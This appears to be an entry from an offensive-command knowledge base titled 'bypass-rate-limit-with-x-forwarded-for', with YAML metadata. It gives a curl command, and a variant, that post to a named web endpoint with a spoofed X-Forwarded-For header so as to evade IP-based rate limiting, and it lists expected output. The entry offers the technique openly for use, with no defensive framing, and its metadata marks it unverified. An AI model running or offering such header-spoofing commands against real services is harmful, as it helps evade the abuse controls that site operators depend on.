---
id: cmd-uuid-1
data: >-
  curl -X POST https://echo.urbandictionary.biz/asd.aspx -H "X-Forwarded-For:
  bing.com" -d "test"
tags:
  - rate-limit
  - header-spoof
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.704Z'
verified: false
validated: true
submitted: true
---
# bypass-rate-limit-with-x-forwarded-for

## Command

```bash
curl -X POST https://echo.urbandictionary.biz/asd.aspx -H "X-Forwarded-For: bing.com" -d "test"
```

## Description

This command sends a POST request to the target endpoint with a spoofed X-Forwarded-For header set to bing.com, causing the server to reflect it and bypass IP-based rate limits by simulating a request from a different origin.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `https://echo.urbandictionary.biz/asd.aspx` | Target URL | Yes |
| `-H "X-Forwarded-For: bing.com"` | Spoofs client IP/hostname | Yes |
| `-d "test"` | Request body data | No |

## Examples

### Basic Usage

```bash
curl -X POST https://echo.urbandictionary.biz/asd.aspx -H "X-Forwarded-For: bing.com" -d "test"
```

### Advanced Usage

```bash
curl -X POST https://echo.urbandictionary.biz/asd.aspx -H "X-Forwarded-For: 8.8.8.8" -d "payload" -v
```

## Expected Output

Server response reflecting the request body and header, without rate limit enforcement, e.g., HTTP 200 with echoed content indicating origin from spoofed source.

## Related

- [[procedures/Bypass-Rate-Limits-with-X-Forwarded-For]]
